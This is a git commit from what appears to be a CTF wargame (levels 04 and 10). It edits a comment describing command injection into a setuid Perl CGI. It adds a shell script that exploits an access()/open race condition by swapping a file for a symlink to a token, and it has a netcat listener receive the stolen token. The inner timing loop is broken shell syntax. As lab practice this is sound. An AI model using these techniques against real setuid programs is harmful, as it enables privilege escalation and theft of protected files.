7c5f53185def2d4ed393656cab009a225ff3ddd4
Douglas ENGSTRAND <dengstra@e2r7p17.42.fr>
2019-04-20 12:23:29 +0200

    level10 cracked

--- level04/Ressources/cgi.sh
+++ level04/Ressources/cgi.sh
@@ -1,6 +1,4 @@
 # Again we exploit the fact that the level04 file has its setuid set.
-# The command needs to be in single quotes because of the qw{param} in the
-# perl code.
 # We connect to a running apache2 webserver that serves the level04 file and
 # we inject the getflag command into the the backticks using x as a key
 # and the `getflag` as a value.
---
+++ level10/Ressources/race.sh
@@ -0,0 +1,32 @@
+# There is a race condition that is exploitable in the code
+# The access function tests for the real user so a symbolic link will fail its
+# test. But later on the read function is what is used to actually read the file.
+# The read function only tests for the effective user
+# wich means a symbolic link to the token will
+# be read because the level10 file itself has read rights to the file.
+
+# What we have to do is to pass in 'link' as an arg which in the beginning
+# is just a file that will pass the access test by being set to 777. But after
+# that we switch this file to a symbolic link to the token that will be read 
+# by the read function and sent to our netcat server.
+############# CLIENT #############
+while true;do
+unlink link
+touch link
+chmod 777 link
+### nice makes the program run slower
+nice -n 20 ~/level10 link 127.0.0.1 &
+### add a small loop to better time the switch
+i=0
+while $i < 100;do
+        i--
+done
+### switch the file that passes the access test with a symbolic link
+### to the token file that passes the read function
+ln -sf ~/token link
+sleep 1
+done
+
+
+############ SERVER #############
+nc -l localhost 6969
